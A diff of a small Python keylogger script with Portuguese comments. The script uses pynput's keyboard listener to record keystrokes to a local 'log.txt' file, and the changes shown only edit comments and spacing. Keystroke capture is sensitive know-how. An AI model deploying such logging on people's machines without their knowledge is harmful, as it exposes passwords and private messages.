@@ -1,4 +1,4 @@
-from pynput import keyboard  # Biblioteca: pynput.keyboard # fornece objetos e listeners para capturar eventos do teclado.
+from pynput import keyboard  # Biblioteca pynput.keyboard: fornece Listener, Key e key.char para capturar eventos do teclado.
 
 IGNORAR = {
     keyboard.Key.shift,
@@ -30,5 +30,5 @@ def on_press(key):  # Abre o arquivo 'log.txt' em modo append (adiciona sem sobr
             else:
                 f.write(f"[{key}] ")
 
-with keyboard.Listener(on_press=on_press) as listener:     # Mensagem informativa ao executar o arquivo direto.
+with keyboard.Listener(on_press=on_press) as listener: # Mensagem informativa ao executar o arquivo direto.
     listener.join()
